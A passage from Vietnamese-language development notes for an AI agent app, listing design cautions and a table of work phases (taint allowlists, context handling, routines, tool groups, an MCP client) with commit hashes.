- **Không nới luật "một lần MCP mỗi run"** chỉ vì bất tiện; thiết kế lối tiếp tục có xác nhận trước.
- **Không để RunInspector thành màn hình cho người dùng**; tách ra.
- **Không thêm embedding trước khi có eval.**
- **Không tin số liệu trên tab "Số liệu" cho tới khi sửa việc đếm trùng.**

---

## Phụ lục A: Đã làm gì từ 09-26 đến 09-27

| Phase | Nội dung chính | Commit tiêu biểu |
| --- | --- | --- |
| A | Allowlist taint trong `execute_tool`; `create_node` không tạo kiểu `syn_*`; `browse` sau taint chỉ theo link đã thấy; resolver chỉ trả IP public; ranh giới trang có nonce; sửa NeedsChoice, `cited`, `tool_succeeded`, supersede, xếp hạng RAG, cắt JSON; frontend: thẻ xin quyền đúng hội thoại, AskBar có thẻ, giữ thụt lề, regenerate | `6de2df8`, `2923118` |
| B | `gate::decide`; `context` (rút gọn, compaction); `calibration`; retry; Anthropic; bảng năng lực; `update_plan`; tách `send_message_inner`; tiền tố prompt ổn định 98,7% | `a758907`, `72b83ec`, `cdf0ead` |
| C | `RunProgress`, nút Plan, "Việc của Syn", `syn_stats`, `ModelTier`, lối vào mới, AskBar dùng `useSynChat` | `ee1bb4c`, `37d120e`, `c335881` |
| D | `delegate`, resume phát lại, memory có hạn xem lại, so sánh chữ bỏ dấu, harness chọn skill, RAG theo đoạn, `[n]` | `dd35150`, `9d5afb3`, `11fa12a` |
| E | Routine (`Trigger::Schedule`, `Surface::Routine`), giao kết quả qua app, hệ điều hành và Telegram | `73dbd4b` |
| F | Nhóm tool (`toolset`), spreadsheet, sửa/xoá giao dịch, MCP client; sửa lỗi `create_transaction` làm mất `financeSchema` | `2e365a4`, `c0884f9`, `c05acad`, `4a956cc` |
